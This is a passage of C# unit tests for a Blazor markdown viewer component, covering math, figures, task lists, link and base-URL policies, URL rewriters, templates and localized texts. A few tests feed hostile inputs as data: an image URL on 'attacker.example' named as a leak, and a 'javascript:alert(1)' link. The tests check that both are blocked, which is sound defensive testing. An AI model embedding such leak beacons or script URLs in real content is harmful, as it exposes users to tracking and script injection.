        var abbreviations = component.Find(".bit-mdv").QuerySelectorAll("abbr");

        Assert.AreEqual(2, abbreviations.Length);
        Assert.AreEqual("The fifth one", abbreviations[0].GetAttribute("title"));
        Assert.AreEqual("Markup", abbreviations[1].GetAttribute("title"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderInlineAndDisplayMath()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Euler: $e^{i\\pi}+1=0$\n\n$$\n\\int_0^1 x^2 dx\n$$");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");
        var inline = root.QuerySelector("span.math-inline");
        var display = root.QuerySelector("div.math-display");

        Assert.IsNotNull(inline);
        Assert.IsNotNull(display);
        // The delimiters are re-emitted so KaTeX and MathJax typeset the output as it stands.
        Assert.AreEqual("$e^{i\\pi}+1=0$", inline.TextContent);
        Assert.AreEqual("$$\\int_0^1 x^2 dx$$", display.TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepMathSafeFromEmphasis()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "$a_1 + b_1 * c$");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var html = component.Find(".bit-mdv").InnerHtml;

        // Without the flavor the underscores would be eaten by emphasis and the TeX would break.
        Assert.DoesNotContain("<em>", html);
        Assert.Contains("a_1 + b_1 * c", component.Find(".bit-mdv").TextContent);
    }

    [TestMethod]
    [DataRow("this costs $5 and that $10.")]
    [DataRow("a $ b $ c")]
    public void BitMarkdownViewerShouldNotReadPricesAsMath(string markdown)
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .math").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotReadMathWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "$a+b$");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .math").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldCaptionATitledImageAsAFigure()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFigures().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a cat](/cat.png \"A cat, mid-jump\")");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var figure = component.Find(".bit-mdv figure");

        Assert.AreEqual("A cat, mid-jump", figure.QuerySelector("figcaption")!.TextContent);
        // The alt stays the alt: a caption everyone reads must not repeat what the alt says.
        Assert.AreEqual("a cat", figure.QuerySelector("img")!.GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveAnUntitledImageAlone()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFigures().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a cat](/cat.png)\n\ntext ![b](/b.png \"t\") in a sentence");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // Neither an untitled image nor one sitting inside a sentence becomes a figure.
        Assert.AreEqual(0, component.FindAll(".bit-mdv figure").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldApplyTheImagePolicyInsideFigures()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFigures().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](https://attacker.example/leak.png \"caption\")");
            parameters.Add(p => p.Pipeline, pipeline);
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var image = component.Find(".bit-mdv figure img");

        // A caption must not be a way around the policy: the figure holds the image as an ordinary
        // child, so the same walk reaches it.
        Assert.IsNull(image.GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerAdvancedPipelineShouldCarryTheRoundTwoFlavors()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown,
                "*[AST]: Abstract Syntax Tree\n\n:::tip Hi\nAn AST.\n:::\n\nTerm\n: def\n\n![i](/i.png \"cap\")");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var root = component.Find(".bit-mdv");

        Assert.IsNotNull(root.QuerySelector(".markdown-container-tip"));
        Assert.IsNotNull(root.QuerySelector("abbr"));
        Assert.IsNotNull(root.QuerySelector("dl"));
        Assert.IsNotNull(root.QuerySelector("figure"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepTaskCheckboxesDisabledWithoutAHandler()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [ ] one");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var checkbox = component.Find(".bit-mdv input[type=checkbox]");

        Assert.IsTrue(checkbox.HasAttribute("disabled"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEnableTaskCheckboxesWhenAHandlerIsSet()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [ ] one");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
            parameters.Add(p => p.OnTaskChanged, _ => { });
        });

        var checkbox = component.Find(".bit-mdv input[type=checkbox]");

        Assert.IsFalse(checkbox.HasAttribute("disabled"));
        Assert.AreEqual("Task 1", checkbox.GetAttribute("aria-label"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReportTheRewrittenSourceWhenATaskIsTicked()
    {
        BitMarkdownViewerTaskChangedEventArgs? reported = null;

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [x] one\n- [ ] two\n- [ ] three");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
            parameters.Add(p => p.OnTaskChanged, args => reported = args);
        });

        component.FindAll(".bit-mdv input[type=checkbox]")[1].Change(true);

        Assert.IsNotNull(reported);
        Assert.AreEqual(1, reported.Value.Index);
        Assert.IsTrue(reported.Value.Checked);
        Assert.AreEqual("- [x] one\n- [x] two\n- [ ] three", reported.Value.Markdown);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNumberNestedTaskCheckboxesInReadingOrder()
    {
        BitMarkdownViewerTaskChangedEventArgs? reported = null;

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [ ] one\n    - [ ] nested\n- [ ] two");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
            parameters.Add(p => p.OnTaskChanged, args => reported = args);
        });

        component.FindAll(".bit-mdv input[type=checkbox]")[2].Change(true);

        Assert.IsNotNull(reported);
        Assert.AreEqual(2, reported.Value.Index);
        Assert.AreEqual("- [ ] one\n    - [ ] nested\n- [x] two", reported.Value.Markdown);
    }

    [TestMethod]
    public void BitMarkdownTaskListShouldSkipMarkersInsideCodeBlocks()
    {
        // The document that documents the syntax must still count the boxes the renderer drew.
        const string markdown = "```\n- [ ] not a task\n```\n\n- [ ] a real one";

        Assert.AreEqual(1, BitMarkdownTaskList.Count(markdown));
        Assert.AreEqual("```\n- [ ] not a task\n```\n\n- [x] a real one",
            BitMarkdownTaskList.Toggle(markdown, 0, true));
    }

    [TestMethod]
    public void BitMarkdownTaskListShouldLeaveTheSourceAloneWhenThereIsNoSuchMarker()
    {
        Assert.AreEqual("- [ ] one", BitMarkdownTaskList.Toggle("- [ ] one", 5, true));
        Assert.AreEqual("- [ ] one", BitMarkdownTaskList.Toggle("- [ ] one", -1, true));
        Assert.AreEqual(string.Empty, BitMarkdownTaskList.Toggle(null, 0, true));
    }

    [TestMethod]
    public void BitMarkdownTaskListShouldUntickAMarkerAndKeepOrderedMarkersIntact()
    {
        Assert.AreEqual("1. [ ] one", BitMarkdownTaskList.Toggle("1. [x] one", 0, false));
        Assert.AreEqual("  * [x] one", BitMarkdownTaskList.Toggle("  * [ ] one", 0, true));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldApplyTheConfiguredLinkPolicy()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
                            externalRel: "noopener noreferrer nofollow ugc")
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[out](https://example.com) and [in](/here)");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.IsFalse(links[0].HasAttribute("target"));
        Assert.AreEqual("noopener noreferrer nofollow ugc", links[0].GetAttribute("rel"));
        Assert.IsFalse(links[1].HasAttribute("target"));
        Assert.IsFalse(links[1].HasAttribute("rel"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldOpenExternalLinksInANewTabByDefault()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[out](https://example.com)");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("_blank", link.GetAttribute("target"));
        Assert.AreEqual("noopener noreferrer", link.GetAttribute("rel"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepLinkTitlesUnderAConfiguredPolicy()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseLinkOptions(internalRel: "author").Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[in](/here \"a title\")");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("a title", link.GetAttribute("title"));
        Assert.AreEqual("author", link.GetAttribute("rel"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveRelativeUrlsAgainstABaseUrl()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseBaseUrl("https://cdn.example.com/docs/").Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![i](img/a.png)\n\n[rel](./page.md) [abs](https://x.example) [frag](#top)");
            parameters.Add(p => p.Pipeline, pipeline);
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        var root = component.Find(".bit-mdv");
        var links = root.QuerySelectorAll("a");

        Assert.AreEqual("https://cdn.example.com/docs/img/a.png", root.QuerySelector("img")!.GetAttribute("src"));
        Assert.AreEqual("https://cdn.example.com/docs/page.md", links[0].GetAttribute("href"));
        // An absolute destination and an in-page fragment are left exactly as written.
        Assert.AreEqual("https://x.example", links[1].GetAttribute("href"));
        Assert.AreEqual("#top", links[2].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveRelativeUrlsAgainstASiteRelativeBase()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseBaseUrl("/images/").Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![i](a.png)");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual("/images/a.png", component.Find(".bit-mdv img").GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeWhateverAUrlRewriterReturns()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseUrlRewriter(_ => "javascript:alert(1)")
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[x](/safe)");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // A rewriter must not be a way around the sanitizer.
        Assert.IsFalse(component.Find(".bit-mdv a").HasAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldDropADestinationARewriterRefuses()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseUrlRewriter(context => context.IsImage ? null : context.Url)
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![alt](/a.png) and [link](/b)");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        Assert.IsFalse(root.QuerySelector("img")!.HasAttribute("src"));
        Assert.AreEqual("alt", root.QuerySelector("img")!.GetAttribute("alt"));
        Assert.AreEqual("/b", root.QuerySelector("a")!.GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRewriteAutolinkedUrlsToo()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseAutoLinks()
            .UseUrlRewriter(context => context.Url + "?utm=none")
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "see https://example.com");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // The rewriter runs last, so the links every flavor creates go through it as well.
        Assert.AreEqual("https://example.com?utm=none", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldHonourAnExplicitHeadingId()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "## Installing the package {#install}");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var heading = component.Find(".bit-mdv h2");

        Assert.AreEqual("install", heading.GetAttribute("id"));
        // The marker names the heading; it is not part of what the heading says.
        Assert.AreEqual("Installing the package", heading.TextContent);
    }

    [TestMethod]
    [DataRow("## A {#id with space}")]
    [DataRow("## A {not-an-id}")]
    [DataRow("## A {#}")]
    public void BitMarkdownViewerShouldLeaveSomethingThatIsNotAnIdMarkerAlone(string markdown)
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.Contains("{", component.Find(".bit-mdv h2").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldGiveAnExplicitlyIdentifiedHeadingItsPermalinkToo()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers(anchorLinks: true).Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "## Install {#install}");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var anchor = component.Find(".bit-mdv h2 a.bit-mdv-anchor");

        Assert.AreEqual("#install", anchor.GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotLetAnExplicitIdCollideWithASlug()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoIdentifiers().Build();

        var document = pipeline.Parse("# Install {#install}\n\n# Install\n");

        var headings = BitMarkdownAstHelper.Descendants(document).OfType<BitMarkdownHeadingNode>().ToList();

        Assert.AreEqual("install", headings[0].Id);
        Assert.AreEqual("install-1", headings[1].Id);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldCloseALongerOuterContainerFenceInTheRightOrder()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().Build();

        var document = pipeline.Parse("::::note\nouter\n\n:::tip\ninner\n:::\n\nstill outer\n::::");

        var outer = document.Children.Single() as BitMarkdownContainerNode;

        Assert.IsNotNull(outer);
        Assert.AreEqual("note", outer.Name);
        Assert.AreEqual(1, outer.Children.OfType<BitMarkdownContainerNode>().Count());
        Assert.AreEqual(2, outer.Children.OfType<BitMarkdownParagraphNode>().Count());
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotSplitAnAutolinkedUrlAroundAnAbbreviation()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAutoLinks().UseAbbreviations().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "*[HTML]: HyperText Markup Language\n\nhttps://example.com/HTML/spec");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // Abbreviations run after autolink literals, so the whole URL is still one link.
        Assert.AreEqual("https://example.com/HTML/spec", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldRenderADocumentAsPlainText()
    {
        var document = BitMarkdownPipelines.GitHub.Parse(
            "# Title\n\nSome **bold** text with a [link](https://e.com) and `code`.\n\n- one\n- two\n");

        var text = BitMarkdownAstHelper.ToPlainText(document);

        // What the document says, with none of the markup it says it with - and no destinations.
        Assert.Contains("Title", text);
        Assert.Contains("Some bold text with a link and code.", text);
        Assert.Contains("one", text);
        Assert.DoesNotContain("https://e.com", text);
        Assert.DoesNotContain("**", text);
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldSeparateBlocksInPlainText()
    {
        var document = BitMarkdownPipelines.Basic.Parse("one\n\ntwo");

        Assert.AreEqual("one\n\ntwo", BitMarkdownAstHelper.ToPlainText(document));
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldReadImageAltTextIntoPlainText()
    {
        var document = BitMarkdownPipelines.Basic.Parse("![a cat](/cat.png)");

        Assert.AreEqual("a cat", BitMarkdownAstHelper.ToPlainText(document));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderCodeBlocksThroughTheTemplate()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "```csharp\nvar x = 1;\n```");
            parameters.Add(p => p.CodeBlockTemplate, code => builder =>
            {
                builder.OpenElement(0, "div");
                builder.AddAttribute(1, "class", "custom-code");
                builder.AddAttribute(2, "data-language", code.Info);
                builder.AddContent(3, code.Content);
                builder.CloseElement();
            });
        });

        var root = component.Find(".bit-mdv");
        var custom = root.QuerySelector(".custom-code");

        Assert.IsNotNull(custom);
        Assert.AreEqual("csharp", custom.GetAttribute("data-language"));
        Assert.AreEqual("var x = 1;", custom.TextContent);
        // The template replaces the default markup rather than adding to it.
        Assert.IsNull(root.QuerySelector("pre"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderImagesThroughTheTemplate()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a cat](/cat.png)");
            parameters.Add(p => p.ImageTemplate, image => builder =>
            {
                builder.OpenElement(0, "figure");
                builder.AddAttribute(1, "data-src", image.Url);
                builder.AddContent(2, image.Alt);
                builder.CloseElement();
            });
        });

        var figure = component.Find(".bit-mdv figure");

        Assert.AreEqual("/cat.png", figure.GetAttribute("data-src"));
        Assert.AreEqual("a cat", figure.TextContent);
        Assert.AreEqual(0, component.FindAll(".bit-mdv img").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderLinksThroughTheTemplate()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[bit](https://bitplatform.dev)");
            parameters.Add(p => p.LinkTemplate, link => builder =>
            {
                builder.OpenElement(0, "button");
                builder.AddAttribute(1, "data-href", link.Url);
                builder.AddContent(2, BitMarkdownInlineHelpers.PlainText(link.Children));
                builder.CloseElement();
            });
        });

        var button = component.Find(".bit-mdv button");

        Assert.AreEqual("https://bitplatform.dev", button.GetAttribute("data-href"));
        Assert.AreEqual("bit", button.TextContent);
        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldApplyTheImagePolicyBeforeTheImageTemplateRuns()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](https://attacker.example/leak.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
            parameters.Add(p => p.ImageTemplate, image => builder =>
            {
                builder.OpenElement(0, "span");
                builder.AddAttribute(1, "data-src", image.Url);
                builder.CloseElement();
            });
        });

        // A template is not a way around the policy: the blocked image arrives with no source.
        Assert.AreEqual(string.Empty, component.Find(".bit-mdv span").GetAttribute("data-src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldUseTheDefaultRenderingForNodeTypesWithNoTemplate()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](/x)\n\n```\ncode\n```");
            parameters.Add(p => p.LinkTemplate, link => builder => builder.AddContent(0, "LINK"));
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("LINK", root.TextContent);
        // Only links were templated, so the code block is still the viewer's own markup.
        Assert.IsNotNull(root.QuerySelector("pre code"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldPickUpATemplateSuppliedOnALaterRender()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](/x)");
        });

        Assert.IsNotNull(component.Find(".bit-mdv a"));

        component.Render(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](/x)");
            parameters.Add(p => p.LinkTemplate, link => builder => builder.AddContent(0, "LINK"));
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
        Assert.Contains("LINK", component.Find(".bit-mdv").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldPutTheLanguageClassOnBothCodeElements()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "```csharp\nvar x = 1;\n```");
        });

        var root = component.Find(".bit-mdv");

        // A highlighter reads the class off the <code>; several of their plugins read it off
        // the <pre>.
        Assert.AreEqual("language-csharp", root.QuerySelector("pre")!.GetAttribute("class"));
        Assert.AreEqual("language-csharp", root.QuerySelector("pre code")!.GetAttribute("class"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveAnUnlabelledCodeBlockUnclassed()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "```\nvar x = 1;\n```");
        });

        Assert.IsNull(component.Find(".bit-mdv pre").GetAttribute("class"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldCloseAQuoteThatEmphasisSplitAcrossTextNodes()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSmartyPants().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "\"**bold**\" and \"plain\"");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // The closing quote is a text node of its own; reading it in isolation would open a
        // second quote instead of closing the first.
        Assert.AreEqual("“bold” and “plain”", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStartQuotingAfreshInEachBlock()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSmartyPants().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "ends in a word\n\n\"a new block\"");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var paragraphs = component.FindAll(".bit-mdv p");

        Assert.AreEqual("“a new block”", paragraphs[1].TextContent);
    }

    [TestMethod]
    public void BitMarkdownAstHelperShouldReadMathAndAbbreviationsIntoPlainText()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().UseAbbreviations().Build();

        var document = pipeline.Parse("*[AST]: Abstract Syntax Tree\n\nThe AST holds $e^{i\\pi}$.");

        var text = BitMarkdownAstHelper.ToPlainText(document);

        // Both flavors carry their text on the node itself rather than in a child text run.
        Assert.Contains("AST", text);
        Assert.Contains("e^{i\\pi}", text);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSlugAHeadingThroughItsMath()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().UseAutoIdentifiers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "## The $x$ theorem");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual("the-x-theorem", component.Find(".bit-mdv h2").GetAttribute("id"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveEscapedDollarsOutOfMath()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a \\$5 rebate");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .math").Count);
        Assert.AreEqual("a $5 rebate", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveAnUnterminatedMathRunAsText()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseMathematics().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a $x and b");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .math").Count);
        Assert.AreEqual("a $x and b", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldExpandAnAbbreviationWithPunctuationInIt()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseAbbreviations().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "*[C++]: A language\n\nI know C++ well.");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        // Terms are matched as text, not as a pattern, so one made of punctuation still works.
        Assert.AreEqual("C++", component.Find(".bit-mdv abbr").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReadContainersAndDefinitionListsInsideOtherBlocks()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().UseDefinitionLists().Build();

        var quoted = pipeline.Parse("> :::note\n> x\n> :::");
        var listed = pipeline.Parse("- Term\n  : def");

        Assert.AreEqual(1, BitMarkdownAstHelper.Descendants(quoted).OfType<BitMarkdownContainerNode>().Count());
        Assert.AreEqual(1, BitMarkdownAstHelper.Descendants(listed).OfType<BitMarkdownDefinitionListNode>().Count());
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReadFrontMatterFromACrlfDocument()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseFrontMatter().Build();

        var frontMatter = BitMarkdownFrontMatterNode.Find(pipeline.Parse("---\r\na: 1\r\n---\r\n\r\nbody"));

        Assert.IsNotNull(frontMatter);
        Assert.AreEqual("a: 1", frontMatter.Text);
    }

    [TestMethod]
    public void BitMarkdownTaskListShouldKeepCrlfLineEndings()
    {
        Assert.AreEqual("- [ ] a\r\n- [x] b", BitMarkdownTaskList.Toggle("- [ ] a\r\n- [ ] b", 1, true));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldWriteItsOwnWordsFromTheConfiguredTexts()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseGitHubFlavored()
            .UseAutoIdentifiers(anchorLinks: true)
            .UseTexts(new BitMarkdownTexts
            {
                AlertWarning = "Achtung",
                Footnotes = "Fußnoten",
                FootnoteBackReference = "Zurück zu {0}",
                Table = "Tabelle",
                PermalinkTo = "Link zu {0}",
            })
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown,
                "# Titel\n\n> [!WARNING]\n> x\n\n| a |\n|---|\n| 1 |\n\ny[^1]\n\n[^1]: z");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("Achtung", root.QuerySelector(".markdown-alert-title")!.TextContent);
        Assert.AreEqual("Tabelle", root.QuerySelector(".bit-mdv-table-wrapper")!.GetAttribute("aria-label"));
        Assert.AreEqual("Fußnoten", root.QuerySelector("section.footnotes")!.GetAttribute("aria-label"));
        Assert.AreEqual("Zurück zu 1", root.QuerySelector(".footnote-backref")!.GetAttribute("aria-label"));
        Assert.AreEqual("Link zu Titel", root.QuerySelector(".bit-mdv-anchor")!.GetAttribute("aria-label"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNameAnInteractiveTaskFromTheConfiguredTexts()
    {
        var pipeline = new BitMarkdownPipelineBuilder()
            .UseTaskLists()
            .UseTexts(new BitMarkdownTexts { Task = "Aufgabe {0}" })
            .Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- [ ] eins");
            parameters.Add(p => p.Pipeline, pipeline);
            parameters.Add(p => p.OnTaskChanged, _ => { });
        });

        Assert.AreEqual("Aufgabe 1", component.Find(".bit-mdv input[type=checkbox]").GetAttribute("aria-label"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldWriteEnglishWhenNoTextsAreConfigured()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> [!TIP]\n> x");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual("Tip", component.Find(".bit-mdv .markdown-alert-title").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderADetailsContainerAsACollapsibleSection()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseContainers().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, ":::details How it works\nThe **body**.\n:::");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        var details = component.Find(".bit-mdv details");

        // Markdown has no syntax of its own for a collapsible section; this is the convention.
        Assert.AreEqual("How it works", details.QuerySelector("summary")!.TextContent);
        Assert.IsNotNull(details.QuerySelector("strong"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLabelANamelessDetailsContainerWithItsName()
    {
